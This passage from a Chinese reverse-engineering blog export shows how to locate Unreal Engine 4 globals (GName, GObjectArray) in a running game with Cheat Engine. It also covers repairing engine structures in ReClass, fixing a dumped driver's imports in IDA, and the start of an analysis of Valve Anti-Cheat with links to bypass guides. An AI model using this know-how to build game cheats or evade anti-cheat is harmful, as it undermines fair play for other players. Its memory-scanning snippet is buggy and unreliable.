src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p>然后将字符串<code>None</code>的地址减掉<code>??</code>后的地址（<strong>offset &#x3D; ②地址 - ①地址 &#x3D; 0xC</strong>）。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>然后将<code>ByteProperty</code>地址剪掉<code>offset</code>后进行搜索。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>排除掉最后两个，然后将第一个地址减掉<code>Idtemp</code>后进行搜索。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>只有一个结果，由于<code>id=0</code>，所以在搜索一次，得到GName。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<ul>\n<li><strong>地址遍历</strong>：</li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint64_t</span> Base = <span class=\"built_in\">GetModuleHandleA</span>(<span class=\"string\">&quot;xxxxx.exe&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"type\">uint64_t</span> gname = Mem::<span class=\"built_in\">Read</span>&lt;<span class=\"type\">uint64_t</span>&gt;(Base + <span class=\"number\">0x8</span> * i);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(gname != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* byteProperty = <span class=\"built_in\">GetName</span>(gname,<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"built_in\">strcmp</span>(byteProperty,<span class=\"string\">&quot;ByteProeprty&quot;</span>))</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;offset_gname=%x\\n&quot;</span>,i*<span class=\"number\">8</span>);</span><br></pre></td></tr></table></figure>\n\n<p>直接从进程.exe开始+8或者+4进行遍历，每一次遍历就将遍历到的地址假设为GName，然后配合算法计算1返回的字符串，若返回的字符串为ByteProperty，则表明本次遍历到的地址为GName。</p>\n<ul>\n<li><p>调试符号：<code>FName::GetNames</code></p>\n<p>  <img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n</li>\n</ul>\n<h1 id=\"三、GObjectArray\"><a href=\"#三、GObjectArray\" class=\"headerlink\" title=\"三、GObjectArray\"></a>三、GObjectArray</h1><ul>\n<li><strong>字符串</strong>：<code>GObject: CanvasObject</code></li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>由于GObjectArray是全局，然后C++编译器直接把GObjectArray的Num成员以地址形式输出。查看NumElements偏移然后计算即可。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<ul>\n<li><strong>构造特征</strong>：</li>\n</ul>\n<p>首先简单认识一下UObject的结构和一些属性。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UObject</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/** virtual function table */</span></span><br><span class=\"line\">  <span class=\"type\">void</span>* vtf; </span><br><span class=\"line\"><span class=\"comment\">/** Flags used to track and report various object states. This needs to be 8 byte aligned on 32-bit</span></span><br><span class=\"line\"><span class=\"comment\">\t    platforms to reduce memory waste */</span></span><br><span class=\"line\">\tEObjectFlags\t\t\t\t\tObjectFlags;</span><br><span class=\"line\">\t<span class=\"comment\">/** Index into GObjectArray...very private. */</span></span><br><span class=\"line\">\tint32\t\t\t\t\t\t\tInternalIndex;                <span class=\"comment\">//表明该对象在GObjectArray中的第几个</span></span><br><span class=\"line\">\t<span class=\"comment\">/** Class the object belongs to. */</span></span><br><span class=\"line\">\tUClass*\t\t\t\t\t\t\tClassPrivate;</span><br><span class=\"line\">\t<span class=\"comment\">/** Name of this object */</span></span><br><span class=\"line\">\tFName\t\t\t\t\t\t\tNamePrivate;</span><br><span class=\"line\">\t<span class=\"comment\">/** Object this object resides in. */</span></span><br><span class=\"line\">\tUObject*\t\t\t\t\t\tOuterPrivate;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>还有GObjectArray结构。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FUObjectItem</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  \t<span class=\"comment\">// Pointer to the allocated object</span></span><br><span class=\"line\">\t<span class=\"keyword\">class</span> <span class=\"title class_\">UObjectBase</span>* Object;</span><br><span class=\"line\">\t<span class=\"comment\">// Internal flags</span></span><br><span class=\"line\">\tint32 Flags;</span><br><span class=\"line\">\t<span class=\"comment\">// UObject Owner Cluster Index</span></span><br><span class=\"line\">\tint32 ClusterRootIndex;\t</span><br><span class=\"line\">\t<span class=\"comment\">// Weak Object Pointer Serial number associated with the object</span></span><br><span class=\"line\">\tint32 SerialNumber;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TUObjectArray</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">enum</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tNumElementsPerChunk = <span class=\"number\">64</span> * <span class=\"number\">1024</span>,</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"comment\">/** Master table to chunks of pointers **/</span></span><br><span class=\"line\">\tFUObjectItem** Objects;</span><br><span class=\"line\">\t<span class=\"comment\">/** If requested, a contiguous memory where all objects are allocated **/</span></span><br><span class=\"line\">\tFUObjectItem* PreAllocatedObjects;</span><br><span class=\"line\">\t<span class=\"comment\">/** Maximum number of elements **/</span></span><br><span class=\"line\">\tint32 MaxElements;</span><br><span class=\"line\">\t<span class=\"comment\">/** Number of elements we currently have **/</span></span><br><span class=\"line\">\tint32 NumElements;</span><br><span class=\"line\">\t<span class=\"comment\">/** Maximum number of chunks **/</span></span><br><span class=\"line\">\tint32 MaxChunks;</span><br><span class=\"line\">\t<span class=\"comment\">/** Number of chunks we currently have **/</span></span><br><span class=\"line\">\tint32 NumChunks;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FUObjectArray</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int32 ObjFirstGCIndex;</span><br><span class=\"line\">\t<span class=\"comment\">/** Index pointing to last object created in range disregarded for GC.\t\t\t\t\t*/</span></span><br><span class=\"line\">\tint32 ObjLastNonGCIndex;</span><br><span class=\"line\">\t<span class=\"comment\">/** Maximum number of objects in the disregard for GC Pool */</span></span><br><span class=\"line\">\tint32 MaxObjectsNotConsideredByGC;</span><br><span class=\"line\">\t<span class=\"comment\">/** If true this is the intial load and we should load objects int the disregarded for GC range.\t*/</span></span><br><span class=\"line\">\t<span class=\"type\">bool</span> OpenForDisregardForGC;</span><br><span class=\"line\">\t<span class=\"comment\">/** Array of all live objects.\t\t\t\t\t\t\t\t\t\t\t*/</span></span><br><span class=\"line\">\tTUObjectArray ObjObjects;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>手动查看GObject的第一个对象，<strong>Index &#x3D; 0</strong> 。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p>第二个对象，<strong>Index &#x3D; 1</strong> 。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p>那么可以构造一个临时特征码。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p>特征码进行模糊处理后得到：<code>?? ?? ?? ?? ?? 7F 00 00 ?? ?? ?? ?? 00 00 00 00</code></p>\n<p>这个时候就不断地尝试假设Index的值，然后到CE中搜索这个特征码，看看Index为几的时候结果是最少的。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p>经过测试得到Index &#x3D; 0xAC的结果最少，然后排除掉绿的地址后将剩下四个拉下来后逐个搜索，经过测试只有地址0x25CC2DC8D40能搜索到结果。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p>将地址拿下来后逐个进行结构分析，查看FObjectItem的大小，结构如下图。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<p>经过排查最终只有下列地址符合我们的需求。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p>现在假设<code>sizeof(FObjectItem)=0x10</code>。然后<code>Index=0xAC</code>，那么该Object在GObjectArray的偏移就等于<code>0xAC * 0x10 = 0xAC0</code>，我们将第一个地址减掉0xAC0得到0x25CC47CFF00，然后搜索这个地址。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<p>发现没有结果，说明这个地址不是来自GObject，换下一个搜索。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p>同样为0，说明<code>sizeof(FObjectItem) != 0x10</code>。那么同样的操作假设<code>sizeof(FObjectItem)=0x20</code>，再重复一遍刚刚的操作，后搜索。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<p>发现有结果，那么<strong>0x25</strong>开头的地址拿下来搜索。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n<p>GObject到手。</p>\n<h1 id=\"UEngine\"><a href=\"#UEngine\" class=\"headerlink\" title=\"UEngine\"></a>UEngine</h1><p>字符串<code>Create GEngine</code>下拉</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%8C%E3%80%81UE4%E5%9B%9B%E4%BB%B6%E5%A5%97%E8%8E%B7%E5%8F%96/image-20230614002449493.png\" alt=\"image-20230614002449493\"></p>\n","categories":["UnrealEngine"]},{"title":"五、静态类和修复完整结构","url":"/2024/04/21/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/","content":"<h1 id=\"一、认识静态类\"><a href=\"#一、认识静态类\" class=\"headerlink\" title=\"一、认识静态类\"></a>一、认识静态类</h1><ul>\n<li><strong>静态类</strong></li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p>每一个对象都是从某一个静态类继承而来的，基类存在UObject的Class成员中。那么通过这个字段我们就可以判断当前对象是什么类。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>知道什么什么类之后，我们就可以对应处理。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">auto</span> obj = <span class=\"built_in\">GetStaticClass</span>();</span><br><span class=\"line\"><span class=\"keyword\">switch</span>(obj)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> CLASS:</span><br><span class=\"line\">      <span class=\"comment\">//处理类</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> FUNCTION:</span><br><span class=\"line\">      <span class=\"comment\">//处理函数</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> UPROPERTY:</span><br><span class=\"line\">      <span class=\"comment\">//处理字段</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    .......</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>其实我们修结构，就是在修这些静态类。（<strong>之所以从对象去修，是因为对象是已经实例化了这个类，类的每个字段已经存在了数据，这样更利于我们修结构，当我们把一些字段修完后，再去修一些基类固定的结构。</strong>）</p>\n<h1 id=\"二、修复完整结构\"><a href=\"#二、修复完整结构\" class=\"headerlink\" title=\"二、修复完整结构\"></a>二、修复完整结构</h1><ul>\n<li><strong>修复UStruct</strong></li>\n</ul>\n<p>上节课已经把UStruct修了个<strong>90%<strong>，这次直接把他修完整。在ObjectsDump.txt中找到基类。（</strong>基类都是Class CoreObject.xxxxxx命名</strong>）</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>地址更新到我们上节课修复好的结构中。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>可以看到基类的PropertiesSize是152的大小，但是我们现在的大小是104，所以我们需要把我们的类给完善。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p>然后因为我们上节课没有修复SuperField，现在来修复一下，通过结构可知，UStruct继承了UField类。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UStruct</span> : <span class=\"keyword\">public</span> UField</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/** 继承自的结构体，可以为空 */</span></span><br><span class=\"line\">    UStruct* SuperStruct;</span><br><span class=\"line\">  <span class=\"comment\">/** 指向下一个子对象的指针 */</span></span><br><span class=\"line\">    UField* Children;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/** 该结构体的总大小 */</span></span><br><span class=\"line\">    int32 PropertiesSize;</span><br><span class=\"line\">    <span class=\"comment\">/** 结构体的对齐大小 */</span></span><br><span class=\"line\">    int32 MinAlignment;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/** Script bytecode associated with this object */</span></span><br><span class=\"line\">    TArray&lt;uint8&gt; Script;</span><br><span class=\"line\">    <span class=\"comment\">/** In memory only: Linked list of properties from most-derived to base */</span></span><br><span class=\"line\">    UProperty* PropertyLink;</span><br><span class=\"line\">    <span class=\"comment\">/** In memory only: Linked list of object reference properties from most-derived to base */</span></span><br><span class=\"line\">    UProperty* RefLink;</span><br><span class=\"line\">    <span class=\"comment\">/** In memory only: Linked list of properties requiring destruction. Note this does not include things that will be destroyed byt he native destructor */</span></span><br><span class=\"line\">    UProperty* DestructorLink;</span><br><span class=\"line\">    <span class=\"comment\">/** In memory only: Linked list of properties requiring post constructor initialization */</span></span><br><span class=\"line\">    UProperty* PostConstructLink;</span><br><span class=\"line\">    <span class=\"comment\">/** Array of object references embedded in script code. Mirrored for easy access by realtime garbage collection code */</span></span><br><span class=\"line\">    TArray&lt;UObject*&gt; ScriptObjectReferences;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于当前我们查看的是<code>UStruct</code>的静态类，<code>UStruct</code>继承了<code>UField</code>的静态类，我们直接在周围查看UField的静态地址。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<ul>\n<li><strong>修复UFunction</strong></li>\n</ul>\n<p>同样把<code>UFunction</code>基类地址扔进<strong>Reclass</strong>。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>可以看到<code>PropertiesSize</code>是200的大小，将当前类大小进行修复。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<ul>\n<li><strong>修复UClass</strong></li>\n</ul>\n<p>由于UClass是继承UStruct，直接，按照同样的操作修复。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<ul>\n<li><strong>修复UStructProperty</strong></li>\n</ul>\n<p>由于<code>UStructProperty</code>是继承<code>UStruct</code>，直接，按照同样的操作修复。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<ul>\n<li><strong>修复UProperty</strong></li>\n</ul>\n<p>类似这种结构，需要找到一个对应类型的对象，扔到CE或者ReClass查看。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UStructProperty</span> : <span class=\"keyword\">public</span> UProperty</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\tUScriptStruct* Struct;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>比如</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p>修到下边这个。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%BA%94%E3%80%81%E9%9D%99%E6%80%81%E7%B1%BB%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%AE%8C%E6%95%B4%E7%BB%93%E6%9E%84/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n","categories":["UnrealEngine"]},{"title":"修复IAT的奇淫技巧","url":"/2024/04/21/%E4%BF%AE%E5%A4%8DIAT%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/","content":"<p>在dump一些驱动样本的时候会遇到这样的情况。</p>\n<p><img src=\"/../images/Reverse/%E4%BF%AE%E5%A4%8DIAT%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720230526152243.png\" alt=\"QQ图片20230526152243\"></p>\n<p>这种是要修复导入表的，大多数解决办法就是给dump文件修复导入表，但是这种方式有点弊端。比如说面对的是一段shellcode代码的话就比较繁琐，所以并不适用。最佳解决办法就是把<code>ntoskrnl.exe</code>模块原封不动加载到ida。</p>\n<hr>\n<p>首先，我们把驱动dump下来后，因为缺少<code>ntoskenl.exe</code>的内存,所以函数调用会变红。所以我们首先是要加载这个内存。</p>\n<p><img src=\"/../images/Reverse/%E4%BF%AE%E5%A4%8DIAT%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720230526152617.png\" alt=\"QQ图片20230526152617\"></p>\n<p>直接把这个模块给dump。</p>\n<p><img src=\"/../images/Reverse/%E4%BF%AE%E5%A4%8DIAT%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/image-20230526152746995.png\" alt=\"image-20230526152746995\"></p>\n<p>然后添加在ida里。</p>\n<p><img src=\"/../images/Reverse/%E4%BF%AE%E5%A4%8DIAT%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720230526152801.png\" alt=\"QQ图片20230526152801\"></p>\n<p><img src=\"/../images/Reverse/%E4%BF%AE%E5%A4%8DIAT%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720230526152807.png\" alt=\"QQ图片20230526152807\"></p>\n<p>一定要注意这里，第一个是0，第二个是模块开始地址，然后点击ok。然后因为它是默认32位加载，我们需要到段区修改。</p>\n<p><img src=\"/../images/Reverse/%E4%BF%AE%E5%A4%8DIAT%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720230526152935.png\" alt=\"QQ图片20230526152935\"></p>\n<p>右键edit，然后这样选。</p>\n<p><img src=\"/../images/Reverse/%E4%BF%AE%E5%A4%8DIAT%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720230526152940.png\" alt=\"QQ图片20230526152940\"></p>\n<p>这里给他设置为64位。</p>\n<p>最后一步！！！！</p>\n<p>因为你只是加载了内存，但是他没有符号！接下来就是要下载这个nt对应的符号！然后加载。</p>\n<p><img src=\"/../images/Reverse/%E4%BF%AE%E5%A4%8DIAT%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720230526152947.png\" alt=\"QQ图片20230526152947\"></p>\n<p><img src=\"/../images/Reverse/%E4%BF%AE%E5%A4%8DIAT%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720230526152950.png\" alt=\"QQ图片20230526152950\"></p>\n<p>就可以啦！</p>\n<p><img src=\"/../images/Reverse/%E4%BF%AE%E5%A4%8DIAT%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720230526152243-1685086347375-9.png\" alt=\"QQ图片20230526152243\"></p>\n<p><img src=\"/../images/Reverse/%E4%BF%AE%E5%A4%8DIAT%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720230526152957.png\" alt=\"QQ图片20230526152957\"></p>\n<p>这个就是效果哦！！！！</p>\n","categories":["Reverse"]},{"title":"从零开始分析VAC","url":"/2023/01/03/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/","content":"<h1 id=\"一、资料收集\"><a href=\"#一、资料收集\" class=\"headerlink\" title=\"一、资料收集\"></a>一、资料收集</h1><blockquote>\n<p>国内:</p>\n<p><a href=\"http://www.qfrost.com/undefined/CSGO/\">CSGO辅助制作思路与VAC保护分析 - -Qfrost-</a></p>\n<p><a href=\"https://www.bilibili.com/read/cv217289/\">【CSGO游戏分析】VAC反作弊系统分析 - 哔哩哔哩 (bilibili.com)</a></p>\n<p>国外：</p>\n<p><a href=\"https://guidedhacking.com/threads/how-to-bypass-vac-valve-anti-cheat-info.8125/\">How To Bypass VAC Valve Anti Cheat Info (guidedhacking.com)</a></p>\n<p>代码:</p>\n<p><a href=\"https://github.com/danielkrupinski/VAC\">danielkrupinski&#x2F;VAC: Source code of Valve Anti-Cheat obtained from disassembly of compiled modules (github.com)</a></p>\n</blockquote>\n<h1 id=\"二、分析笔记\"><a href=\"#二、分析笔记\" class=\"headerlink\" title=\"二、分析笔记\"></a>二、分析笔记</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">实验目标：CSGO</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-1-ARK分析\"><a href=\"#2-1-ARK分析\" class=\"headerlink\" title=\"2.1 ARK分析\"></a>2.1 ARK分析</h2><p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104095003980.png\" 